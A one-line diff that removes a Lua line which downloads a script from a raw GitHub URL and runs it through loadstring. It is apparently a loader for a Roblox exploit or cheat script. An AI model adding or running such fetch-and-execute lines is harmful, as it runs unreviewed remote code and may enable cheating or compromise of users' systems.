@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Rinaldo1101/Nada/refs/heads/main/Nada.lua"))()
